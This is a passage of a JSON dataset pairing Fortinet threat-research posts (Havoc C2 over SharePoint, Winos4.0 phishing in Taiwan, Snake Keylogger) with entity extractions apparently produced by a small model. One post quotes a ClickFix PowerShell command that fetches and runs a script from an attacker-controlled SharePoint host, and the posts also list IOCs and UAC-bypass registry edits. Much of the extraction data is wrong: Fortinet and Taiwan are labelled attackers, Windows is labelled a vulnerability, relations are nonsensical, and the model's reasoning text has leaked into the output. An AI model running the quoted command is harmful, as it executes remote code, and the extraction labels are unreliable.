920da0917dbf7ead5531406b324de83656c90a39176f5377c123fe36d257668b JS/Agent.409D!tr seller-rn-mng-lib_6.5.8 673db52c28aac71f8cf80ee1718b8ea98e1f8e0b3f1293da15fd26c4e6343927 JS/Agent.409D!tr xeno.dll_1.0.2/index.js 6a68848e118ec280d01a1dc989e8d67ca10b3f14aab98eb87a23b340c863fdcf JS/Agent.B3EF!tr xeno.dll_1.0.2 973a87cc0baa17c53a17467e188d82241458f7ff1e70e920014eaf2bacbe3a07 JS/Agent.B3EF!tr malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (malicious software packages, File), (November 2024, Date), (FortiGuard Labs, Organization), (Fortinet, Organization), (AI-driven OSS malware detection system, Tool), (low-file-count packages, File), (command overwrite techniques, Technique), (typosquatting, Technique), (obfuscation, Technique), (install scripts, Technique)\nRelationships: (FortiGuard Labs, analyzes, malicious software packages), (FortiGuard Labs, uses, AI-driven OSS malware detection system), (FortiGuard Labs, observes, low-file-count packages), (FortiGuard Labs, observes, command overwrite techniques), (FortiGuard Labs, observes, typosquatting), (FortiGuard Labs, observes, obfuscation), (FortiGuard Labs, observes, install scripts), (FortiGuard Labs, identifies, techniques), (Fortinet, identifies, malicious software packages), (FortiGuard Labs, identifies, techniques), (FortiGuard Labs, identifies, techniques), (FortiGuard Labs, identifies, techniques), (FortiGuard Labs, identifies, techniques), (FortiGuard Labs, identifies, techniques), (FortiGuard Labs, identifies, techniques), (FortiGuard Labs, identifies, techniques), (FortiGuard Labs, identifies, techniques), (FortiGuard Labs, identifies, techniques), (FortiGuard Labs, identifies, techniques),",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "malicious software packages",
          "File"
        ],
        [
          "November 2024",
          "Date"
        ],
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Fortinet",
          "Organization"
        ],
        [
          "AI-driven OSS malware detection system",
          "Tool"
        ],
        [
          "low-file-count packages",
          "File"
        ],
        [
          "command overwrite techniques",
          "Technique"
        ],
        [
          "typosquatting",
          "Technique"
        ],
        [
          "obfuscation",
          "Technique"
        ],
        [
          "install scripts",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "analyzes",
          "malicious software packages"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "AI-driven OSS malware detection system"
        ],
        [
          "FortiGuard Labs",
          "observes",
          "low-file-count packages"
        ],
        [
          "FortiGuard Labs",
          "observes",
          "command overwrite techniques"
        ],
        [
          "FortiGuard Labs",
          "observes",
          "typosquatting"
        ],
        [
          "FortiGuard Labs",
          "observes",
          "obfuscation"
        ],
        [
          "FortiGuard Labs",
          "observes",
          "install scripts"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "techniques"
        ],
        [
          "Fortinet",
          "identifies",
          "malicious software packages"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "techniques"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "techniques"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "techniques"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "techniques"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "techniques"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "techniques"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "techniques"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "techniques"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "techniques"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "techniques"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 19,
    "model": "Qwen3 4B",
    "index": 25
  },
  {
    "title": "Havoc: SharePoint with Microsoft Graph API turns into FUD C2",
    "link": "https://www.fortinet.com/blog/threat-research/havoc-sharepoint-with-microsoft-graph-api-turns-into-fud-c2",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High Havoc is a powerful command-and-control (C2) framework. Like other well-known C2 frameworks, such asCobalt Strike,Silver, andWinos4.0, Havoc has been used inthreat campaignsto gain full control over the target. Additionally, It is open-source and available on GitHub, making it easier for threat actors to modify it to evade detection. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FortiGuard Labs recently discovered a phishing campaign that combines ClickFix and multi-stage malware to deploy a modified Havoc Demon Agent. The threat actor hides each malware stage behind a SharePoint site and uses a modified version of Havoc Demon in conjunction with the Microsoft Graph API to obscure C2 communications within trusted, well-known services. Figure 1 shows the attack chain. The attack campaign starts with a phishing email containing an HTML file as an attachment, as illustrated in Figure 2. It uses a brief explanation and an urgent tone to prompt the recipient to open the attachment immediately. The attachment, “Documents.html,” is a ClickFix attack that embeds a fake error message and instructions in HTML to deceive users into copying and pasting a malicious PowerShell command into their terminal or PowerShell, ultimately executing malicious code. Decoding the base64-encoded string shown in Figure 3 reveals a PowerShell command that downloads and executes a remote PowerShell script. powershell -w h -c \"iwr ‘hxxps://hao771[.]sharepoint.com/_layouts/15/download.aspx?share=EU7smZuKo-pDixZ26BSAaX0BVVcF5VkOc7qEvjsDSAH9OQ'|iex\" The Script file is hosted in SharePoint and controlled by the threat actor. When the script runs, it checks whether the execution environment is a sandbox by verifying the number of domain computers. It then deletes all registry entries under HKCU:\\Software\\Microsoft with names starting with \"zr_\" and adds the specified property as an infection marker, as shown in Figure 4. Next, the script verifies the existence of pythonw.exe. If it’s not found, it downloads the Python interpreter. Otherwise, it directly runs the Python script. Finally, the remote Python script is retrieved and executed in hidden windows to obscure malicious activity, as shown in Figure 5. Like the PowerShell script, the Python script is hosted on the same SharePoint. It contains debug information written in Russian and serves as a shellcode loader. We executed the script directly with the Python interpreter in the terminal. The log displays “Выделение памяти” (memory allocation), \"Запись в память” (write to memory), \"Выполнение shellcode” (execution of shellcode), and \" Завершение выполнения скрипта” (script execution completion) in sequence, indicating successful shellcode execution, as seen in Figure 6. KaynLdr is a Github Shellcode Loader designed to reflectively load an embedded DLL. It complicates analysis by using API hashing with a modified DJB2 algorithm and leverages resolved ntdll APIs for memory allocation and mapping. The instruction “call rax” executes the embedded DLL's entry point, as shown in Figure 7. Havoc is an open-source post-exploitation command and control framework used in red teaming exercises andattack campaignsto gain complete control over compromised targets. In this attack campaign, we observed that the threat actor uses Havoc in conjunction with the Microsoft Graph API to conceal C2 communication within well-known services. The modified Havoc Demon DLL still starts with DemonInit and uses the same hash algorithm as KaynLdr to retrieve the necessary APIs and initialize the configuration objects. The second function, “SharePointC2Init,” initializes files on the actors' SharePoint site using the Microsoft Graph API. It first combines the hardcoded shared secret with the necessary parameters for a POST request. It then sends the request to the /token endpoint of the Microsoft Identity Platform to obtain access tokens for Microsoft Graph APIs. Next, it utilizes the obtained token to create two files in SharePoint's default document library by making a PUT request, as shown in Figure 10. The Havoc AgentID generates the VictimID as a filename, concatenated with the suffix “pD9-tKout/pD9-tKin” to indicate their purpose. The initial packet sent to C2 is a CheckIn request containing data gathered from the DemonMetaData function. In this step, the victim's information—such as Host Name, User Name, Domain Name, IP Address, Process Details, OS Information, whether the user has an elevated account, and the configuration in the Demon DLL—is sent to the C2 server. All content is encrypted using the AES-256 algorithm in CTR mode with a randomly generated 256-bit key and a 128-bit IV. Finally, it is combined with the header, as illustrated in Figure 11, before being sent to the C2 server via the TransportSend function. The TransportSend function has been modified to communicate with the C2 by accessing two files: {VictimID}pD9-tKout and {VictimID}pD9-tKin. It updates the request to the “{VictimID}pD9-tKout” file and then retrieves the response from the C2 by using Microsoft Graph API with the GET method to access the contents of the ‘{VictimID}pD9-tKin’ file. If the response is successfully retrieved, the content of file '{VictimID}pD9-tKin' is immediately erased. Next, the content in the response is compared with the AgentID. If they match, the session.connected flag is set, and it enters the dispatcher routine to await new tasks from the attacker. In the dispatcher routine, the agent sends a 'Get Job' request and parses the response into Command ID, Request ID, and task. Although we only observed DEMON_COMMAND_NO_JOB (Command ID: 0xA) during our analysis, as shown in below, we found that the task would be decrypted and executed if a different command ID exists and is not 0xA in the program. The supported commands are the same as those in Havoc Github, as shown in Figure 14. They include gathering information about the target, file operations, command and payload execution, token manipulation, and Kerberos Attacks. In addition to staying alert for phishing emails, guided messages that encourage opening a terminal or PowerShell must be handled with extra caution to prevent inadvertently downloading and executing malicious commands. In this article, we uncovered the execution flow and the altered open-source post-exploitation framework used in this attack. Public services once again play a crucial role in the attack campaign, now further integrated with modified Havoc Demon to hide malicious communication within the Microsoft Graph API, making identification and detection even more challenging. The malware described in this report are detected and blocked byFortiGuard Antivirusas: HTML/Agent.A5D4!trPowerShell/MalwThreat!ebc5FTPython/Agent.DF60!trW64/Havoc.L!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document. FortiGuard Labs provides theBackdoor.Havoc.AgentIPS signature to block Havoc C2 network communications. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. hao771[.]sharepoint.com 51796effe230d9eca8ec33eb17de9c27e9e96ab52e788e3a9965528be2902330989f58c86343704f143c0d9e16893fad98843b932740b113e8b2f8376859d2ddA5210aaa9eb51e866d9c2ef17f55c0526732eacb1a412b910394b6b51246b7dacc151456cf7df7ff43113e5f82c4ce89434ab40e68cd6fb362e4ae4f70ce65b3 C2 server FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (Havoc, Malware), (Cobalt Strike, Tool), (Silver, Tool), (Winos4.0, Tool), (Havoc Demon Agent, File), (ClickFix, Technique), (Microsoft Graph API, Tool), (SharePoint, Tool), (Documents.html, File), (Microsoft Windows, Vulnerability), (Phishing, Technique), (FortiGuard Labs, Attacker), (2025 Global Threat Landscape Report, Threat Type), (Havoc Demon, Malware), (Microsoft Graph API, Tool), (SharePoint, Tool), (ClickFix, Technique), (Phishing, Technique), (Microsoft Windows, Vulnerability), (Havoc Demon Agent, File), (Documents.html, File), (FortiGuard Labs, Attacker), (2025 Global Threat Landscape Report, Threat Type)\nRelationships: (Havoc, usedBy, Cobalt Strike), (Havoc, usedBy, Silver), (Havoc, usedBy, Winos4.0), (Havoc Demon Agent, associatedWith, Havoc), (ClickFix, usedBy, Phishing), (Microsoft Graph API, usedBy, Phishing), (SharePoint, usedBy, Phishing), (Documents.html, associatedWith, ClickFix), (Microsoft Windows, exploitedBy, Phishing), (Phishing, usedBy, ClickFix), (Phishing, usedBy",
      "entities": [
        [
          "Havoc",
          "Malware"
        ],
        [
          "Cobalt Strike",
          "Tool"
        ],
        [
          "Silver",
          "Tool"
        ],
        [
          "Winos4.0",
          "Tool"
        ],
        [
          "Havoc Demon Agent",
          "File"
        ],
        [
          "ClickFix",
          "Technique"
        ],
        [
          "Microsoft Graph API",
          "Tool"
        ],
        [
          "SharePoint",
          "Tool"
        ],
        [
          "Documents.html",
          "File"
        ],
        [
          "Microsoft Windows",
          "Vulnerability"
        ],
        [
          "Phishing",
          "Technique"
        ],
        [
          "FortiGuard Labs",
          "Attacker"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Threat Type"
        ],
        [
          "Havoc Demon",
          "Malware"
        ],
        [
          "Microsoft Graph API",
          "Tool"
        ],
        [
          "SharePoint",
          "Tool"
        ],
        [
          "ClickFix",
          "Technique"
        ],
        [
          "Phishing",
          "Technique"
        ],
        [
          "Microsoft Windows",
          "Vulnerability"
        ],
        [
          "Havoc Demon Agent",
          "File"
        ],
        [
          "Documents.html",
          "File"
        ],
        [
          "FortiGuard Labs",
          "Attacker"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Threat Type"
        ]
      ],
      "relationships": [
        [
          "Havoc",
          "usedBy",
          "Cobalt Strike"
        ],
        [
          "Havoc",
          "usedBy",
          "Silver"
        ],
        [
          "Havoc",
          "usedBy",
          "Winos4.0"
        ],
        [
          "Havoc Demon Agent",
          "associatedWith",
          "Havoc"
        ],
        [
          "ClickFix",
          "usedBy",
          "Phishing"
        ],
        [
          "Microsoft Graph API",
          "usedBy",
          "Phishing"
        ],
        [
          "SharePoint",
          "usedBy",
          "Phishing"
        ],
        [
          "Documents.html",
          "associatedWith",
          "ClickFix"
        ],
        [
          "Microsoft Windows",
          "exploitedBy",
          "Phishing"
        ],
        [
          "Phishing",
          "usedBy",
          "ClickFix"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 23,
    "relationship_count": 10,
    "model": "Qwen3 4B",
    "index": 26
  },
  {
    "title": "Winos 4.0 Spreads via Impersonation of Official Email to Target Users in Taiwan",
    "link": "https://www.fortinet.com/blog/threat-research/winos-spreads-via-impersonation-of-official-email-to-target-users-in-taiwan",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In January 2025, FortiGuard Labs observed an attack that used Winos4.0, an advanced malware framework actively used in recent threat campaigns, to target companies in Taiwan. Figure 1 shows an example of the attack chain. Usually, there is a loader that is only used to load the malicious DLL file, and the Winos4.0 module is extracted from the shellcode downloaded from its C2 server. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. According  to a report released in November 2024, Winos4.0 was distributed through gaming-related applications, however, it spread via an email masquerading as from Taiwan's National Taxation Bureau in the campaign in January 2025. The sender claimed that the malicious file attached was a list of enterprises scheduled for tax inspection and asked the receiver to forward the information to their company's treasurer. The attachment also masquerades as an official document from the Ministry of Finance. It asks the victim to download the attached list of enterprises slated for tax inspection. However, the list is a ZIP file containing malicious DLL for the next attack stage. The files in the ZIP file are executed in the following sequence: 20250109.exe, ApowerREC.exe, and lastbld2Base.dll. 20250109.exe is a launcher originally used to execute the actual APowerREC.exe in ./app/ProgramFiles. The attacker created the same folder structure in the ZIP file and used a loader to replace ApowerREC.exe. The fake ApowerREC.exe does nothing but call a function imported from lastbld2Base.dll. When an executable file is run, it loads all necessary DLL files and executes their entry functions. As a result, the DLLMain function of lastbld2Base.dll, where the malicious code is located, is loaded when the fake ApowerREC.exe is executed. Lastbld2Base.dll decrypts its data to get the shellcode for the next stage. At the bottom of the shellcode are configurations, including the IP address of the C2 server, the name of the base registry key for the next stage, and flags for features for the current stage. The optional features include permission evaluation, hiding the window of the current process, and anti-sandbox functions. If higher permission is needed in this attack, it tests the current permissions by opening the registry key HKEY_LOCAL_MACHINE\\SOFTWARE and executing ApowerREC.exe as an administrator. For the anti-sandbox function, it takes two screenshots within a two-second interval. If there are more than 20,000 different pixels in the second screenshot, which means a user is active on the computer, it performs its remaining tasks. Otherwise, it continues taking screenshot and compares it with the first one for at most one hour. After the optional features are run, it downloads the encrypted shellcode data and the Winos4.0 module from its C2 server. The encrypted data is written to HKEY_CURRENT_USER\\B118D5E900008F7A, the base registry for configurations in the next stage, with a value name of “0”. After this, it decrypts the data to get the shellcode, followed by partially decrypted data of the module. The new shellcode decrypts the data with another algorithm to get a DLL file and parses its export table to get the address of the only export function. In this attack, the module from the C2 server creates eight threads to perform different tasks: MainThread, CloseWindow, Screenshot, Keylog, Clipboard, USB, ReadReg, and Anti-AV. Mutex: Global\\MainThreadB118D5E900008F7AThe MainThread creates the remaining seven threads. In addition, it performs the following actions: API Constant Description SystemParametersInfoW SPI_SETSCREENSAVEACTIVE Deactivates the screen saver SetThreadExecutionState ES_CONTINUOUS ES_AWAYMODE_REQUIRED ES_SYSTEM_REQUIRED Enables the Away mode so the program keeps working while the computer appears to be sleeping PowerSetRequest PowerRequestDisplayRequired The display remains on even if the computer is idle Registry key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Value name: ConsentPromptBehaviorAdmin Value: 0 Description: Allows the Consent Admin to perform an operation that requires elevation without consent or credentials. Registry key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Value name: PromptOnSecureDesktop Value: 0 Description: Disables secure desktop prompting Mutex: Global\\ClosewWindowIt calls theEnumWindowsfunction to enumerate all visible windows to find the windows of kxecenter(Kingsoft Security) and HipsTray(Huorong). It checks the window's width to ensure it is the security prompt window. When the target window is found, it clicks the \"Permit\" button on the prompt window. Mutex: Global\\ScreenShotB118D5E900008F7AIt takes screenshots of applications that contain the keywords stored in the valuepicshotdataof HKEY_CURRENT_USER\\B118D5E900008F7A, and the screenshots are saved to C:\\ProgramData\\B118D5E900008F7A\\{keyword}\\{Date}.Ifpicshotdatadoesn’t exist, this thread will not be executed. Mutex: Global\\KeylogB118D5E900008F7AIt keeps checking the value of theKEYLOGof HKEY_CURRENT_USER\\B118D5E900008F7A. If the value is 1, it creates a mutex C:\\ProgramData\\B118D5E900008F7A\\Regedit.log and starts recording the user's keystrokes and the contents in the clipboard. The data is written to C:\\ProgramData\\B118D5E900008F7A\\Regedit.log. Mutex: Global\\ClipboardB118D5E900008F7AIt replaces keywords in the clipboard with the text stored in the registry value clipboarddata of HKEY_CURRENT_USER\\B118D5E900008F7A. The value contains three properties: Mode, Expression, and Replace. When Mode is “Modify,” Expression specifies the pattern to look for in the clipboard, and Replace specifies the replacement.If clipboarddata doesn’t exist, this thread will not be executed. Mutex: Global\\UsbB118D5E900008F7AIt collects the names of connected USB devices every three seconds except for those that include the following keywords: mouse, keyboard, wlan, lenovo, and sanmsung (misspelling of samsung). If a new USB device is inserted or removed, it updates the device list with a Chinese annotation that means “USB device inserted” or “USB device removed.” It reads the value B118D5E900008F7A0 from HKCU\\Console to get the shellcode and execute it every five seconds. First, it bypasses the UAC prompt by modifying the registry key values mentioned in MainThread. Then, it callsGetTcpTable2to obtain active TCP connections. If a TCP connection is owned by 360Safe, Kingsoft, or Huorong processes, it disables it. There are other attack chains used in this campaign. The查看10.exe(view10) is compiled from a Python script by Nuitka, and it loads Python311.dll, which is the malicious file. The shellcode from Python311.dll decrypts its data to get a DLL file that writes another shellcode to the registry value ofhrqnmlb{XXXXXX}of the HKCU\\Console\\, and the shellcode is also saved as bb.jpg in C:\\Users\\Public\\Download. The shellcode plays the same role as the shellcode from lastbld2Base.dll we mentioned above. However, its marker string is used by a version preceding the one described in areportreleased in November 2024. Another point worth mentioning is that the DLL contains multiple snippets of shellcode that are identical to Figure 13 except for the C2 domain. While only  9010[.]360sdgg[.]com is used in this attack, other domains have been observed in different campaigns. The 上线模块.dll(online module) is used to take screenshots of WeChat and the online bank, and the akagi.exe is a module of UACMe. Winos4.0 makes good use of registry keys. The C2 server writes most configurations for optional features and encrypts data to the values of the base registry key and its subkeys. This provides the flexibility of optional features. However, it’s also a good hint for forensic analysis. We can rebuild files from the data and perform further analysis. FortiGuard will continue monitoring these attack campaigns and providing appropriate protections as required. The malware described in this report is detected and blocked byFortiGuard Antivirusas: PDF/Agent.A6DC!tr.dldrW32/Agent.7BBA!trW64/UACMe.O!trW64/ValleyRat.A!tr.spy FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 43[.]137[.]42[.]254206[.]238[.]221[.]60206[.]238[.]221[.]240124[.]156[.]100[.]172206[.]238[.]221[.]244 1234[.]360sdgg[.]com9001[.]360sdgg[.]com9002[.]360sdgg[.]com9003[.]360sdgg[.]com9005[.]360sdgg[.]com9006[.]360sdgg[.]com9007[.]360sdgg[.]com9009[.]360sdgg[.]com9010[.]360sdgg[.]comffggssa-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comfuued5-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]com0107-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comrgghrt1140120-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comhei-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comchakan202501-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comwrwyrdujtw114117-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comfdsjg114-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comsjujfde-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comhtrfe4-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]com0611-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comtwzfw[.]vip 36afc6d5dfb0257b3b053373e91c9a0a726c7d269211bc937704349a6b4be9b90e3c9af7066ec72406eac25cca0b312894f02d6d08245a3ccef5c029bc297bd267395af91263f71cd600961a1fd33ddc222958e83094afdde916190a0dd5d79cf4d3477a19ff468d234a5e39652157b2181c8b51c754b900bcfa13339f577e7cc9a8db23d089aa71466b4bde51a51a8cfdcc28e8df33b4c63ce867bd381e5fe5 e2b75baeb7ed21fb8f27984f941286770d1c3c0b60fce8d7fa5b167bd24ba6dcdffbeefc632b20d2ef867553684e9971ab76e1223e743604a5275713423b616820c34b5f0983021414b168913c3da267caf298d8f0f5e3ec0ce97db5f4f483166c33715a14fdc917b5b09b6e1b5dad07bb769493eafbf7ca1023830b4059e00375a4d75c35724140149c9c5056c1bcbd328bbe1e5d1d1ef34205ed5442d2b348fed394a3653b7c6fcc1b277eda6e18eb0983a7e024be5b51e5188b3cfb9512e8a067d848f099e6d1e465f9761a5b85392d550303bfa75fac920d444fd980c949c55757075259fa4be6941dd273c4a4a2fcc29e6ba427dec124b25b299b3505fe64a876e6cb3cf3122febc84a00ec3e0740c054cff955164971c470e1b5e5f1bbd4ac82de8dda9796579cd8ea0f84b43c7a980cdb0e9cdb8abe8981a2d215ed2f(20c34b5f0983021414b168913c3da267caf298d8f0f5e3ec0ce97db5f4f48316 Corrupt) 268c72f5482374660a132d1b91cac0c04b4724a214db4f052eb421e36c2829210a4bbb998bd3a3bcc72cf759689a5656dc74590b731d0affbfc317cf484ed28b79c64d2e77acdbcdbd35cbb29497941335d7e3ab6ebb474064f095e745f0d6437f22305679e46e1fd5043beb136108197c0921643ce0d680f990a3018ade485b594d907855d35ee7689a568e4ac43e4e0ed90de047d91b0253ef79da71ecbc081f3b041eee1ece8cf6aa5c742aeb8c0ac2266cccecca7888772509227c4f8669514933468ac1dd9f7db4e2693f1be7f84deb35c33f8f9934fad32caaae9ef6117a5b26f6dd7b8e0d648e9804ec932603b7d7a5f76c7a8c537ab0c2be54f51fa98b1b9a789136ca3abe25938204845c351aaf0c97c0708ade8d4d8ba4ded95ba71ad1f2eec961bc7a35abeac486f843b7caece0929b13f1dab47fbdc0406ac4e34c1ea827713f1eb57cc0e8e9d171d4e21d116f846b174bc05114eef5674c96531a342426d59e7fdc4abfb74c2225f68382172e03b0f8d496a57ae647411f0fbd2ce73cbfab0beb3663c0151ba7c310e4dbf69f295d8a18114435506483d774ac0a4bbb998bd3a3bcc72cf759689a5656dc74590b731d0affbfc317cf484ed28b514933468ac1dd9f7db4e2693f1be7f84deb35c33f8f9934fad32caaae9ef61176ac08358f230bca3e8b8448b3c177094aeac25402b929f5f73869ec77173a44 advanced malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (Microsoft Windows, Vulnerability), (Winos4.0, Malware), (Taiwan, Attacker), (National Taxation Bureau, Attacker), (Ministry of Finance, Attacker), (FortiGuard Labs, Threat Type), (2025 Global Threat Landscape Report, Threat Type)\nRelationships: (FortiGuard Labs, observed, Winos4.0), (Winos4.0, target, Taiwan), (Winos4.0, target, National Taxation Bureau), (Winos4.0, target, Ministry of Finance), (Winos4.0, used, FortiGuard Labs), (Winos4.0, used, 2025 Global Threat Landscape Report)\nOkay, let's tackle this. First, I need to identify all the entities in the input text according to the given types. The text mentions \"Microsoft Windows\" in the context of affected platforms. Since the entity types include Vulnerability, I might think that's a vulnerability, but the text says \"Affected Platforms\" which is more about the target system, not a vulnerability. Wait, the example 2 had \"Microsoft Office\" as a tool. Hmm, maybe \"Microsoft Windows\" here is a platform, but the entity types don't have a Platform type. The entity types are Malware, Threat Type, Attacker, Technique, Tool, Vulnerability, IP, Domain, URL, File, Hash.",
      "entities": [
        [
          "Microsoft Windows",
          "Vulnerability"
        ],
        [
          "Winos4.0",
          "Malware"
        ],
        [
          "Taiwan",
          "Attacker"
        ],
        [
          "National Taxation Bureau",
          "Attacker"
        ],
        [
          "Ministry of Finance",
          "Attacker"
        ],
        [
          "FortiGuard Labs",
          "Threat Type"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Threat Type"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "observed",
          "Winos4.0"
        ],
        [
          "Winos4.0",
          "target",
          "Taiwan"
        ],
        [
          "Winos4.0",
          "target",
          "National Taxation Bureau"
        ],
        [
          "Winos4.0",
          "target",
          "Ministry of Finance"
        ],
        [
          "Winos4.0",
          "used",
          "FortiGuard Labs"
        ],
        [
          "Winos4.0",
          "used",
          "2025 Global Threat Landscape Report"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 6,
    "model": "Qwen3 4B",
    "index": 27
  },
  {
    "title": "FortiSandbox 5.0 Detects Evolving Snake Keylogger Variant",
    "link": "https://www.fortinet.com/blog/threat-research/fortisandbox-detects-evolving-snake-keylogger-variant",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows usersImpact:Silently records keystrokes to collect credentials, data, and other sensitive informationSeverity level:High FortiGuard Labs leveraged the advanced capabilities of FortiSandbox v5.0 (FSAv5) to detect a new variant of the Snake Keylogger (also known as 404 Keylogger). This malware, identified as AutoIt/Injector.GTY!tr, has been responsible for over 280 million blocked infection attempts, highlighting its extensive reach across regions. The majority of these detections have been concentrated in China, Turkey, Indonesia, Taiwan, and Spain, suggesting a significant impact in these areas. This high volume of detections underscores the malware’s ongoing global threat and its potential to affect organizations and users worldwide. The recent surge in activity also highlights the continuous evolution of keylogger malware and the need for advanced detection mechanisms. Typically delivered through phishing emails containing malicious attachments or links, Snake Keylogger is designed to steal sensitive information from popular web browsers like Chrome, Edge, and Firefox by logging keystrokes, capturing credentials, and monitoring the clipboard. In addition to data theft, Snake Keylogger exfiltrates the stolen information to its command-and-control (C2) server using SMTP (email) and Telegram bots, allowing attackers to access stolen credentials and other sensitive data. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FSAv5 features a new AI engine, PAIX, an advanced machine learning-powered system designed to detect and analyze previously unknown threats in real-time. By utilizing a blend of behavioral analysis and file attributes, PAIX can identify suspicious activity and potential malware before they affect your environment. Integrated into FortiSandbox devices, the engine is regularly updated with the latest AI models to ensure optimal protection. In the following sections, we will explore how FSAv5 detected this malware, the behavioral indicators it leveraged for identification, and Snake Keylogger's technique to evade detection and analysis. We will also examine how FortiSandbox’s advanced heuristics and machine learning models contribute to identifying and mitigating emerging keylogger threats. The AI engine in FSAv5 provides detailed static analysis, uncovering obfuscated strings and embedded APIs responsible for keylogging and credential harvesting. Additionally, FSAv5’s dynamic analysis capabilities captured the keylogger’s runtime behavior, including processes launched by the malware and the establishment of network connections to its command-and-control (C2) server. These insights revealed Snake Keylogger’s ability to exfiltrate stolen data while avoiding traditional detection mechanisms, further emphasizing the importance of FSAv5’s comprehensive malware analysis. Additionally, suspicious indicators triggered during the analysis were recorded and categorized (Figure 3). This comprehensive documentation provides further context and aids in identifying potential malicious activities. With the enhancements in FSAv5, these indicators not only document observed behaviors but also correlate them with specific MITRE ATT&CK techniques. This correlation provides a deeper understanding of the tactics employed by the malware. The integrated AI in FSAv5 performs static analysis, enabling it to detect malware without executing its code. As shown in Figure 4, the AI engine can efficiently identify potential threats by analyzing the malware’s code structure, embedded signatures, and other static properties. This new variant of Snake Keylogger employs AutoIt, a scripting language commonly used for automating tasks in the Windows environment, to deliver and execute its malicious payload. AutoIt is often leveraged by threat actors due to its versatility and ability to generate standalone executables that can bypass traditional antivirus solutions. In this variant of Snake Keylogger, the executable is an AutoIt-compiled binary, which adds an additional layer of obfuscation to hinder detection and analysis. The use of AutoIt not only complicates static analysis by embedding the payload within the compiled script but also enables dynamic behavior that mimics benign automation tools. Figure 5 shows the AutoIt encrypted script used for compiling the binary. The AI in FSAv5 identified these embedded malicious strings and API calls. Upon execution, Snake Keylogger drops a copy of itself to the %Local_AppData%\\supergroup folder under “ageless.exe,” setting its attributes to hidden. Once established in this directory, it drops another file into the %Startup% folder, named ageless.vbs. This script contains a command that utilizes WScript.Shell() to call the 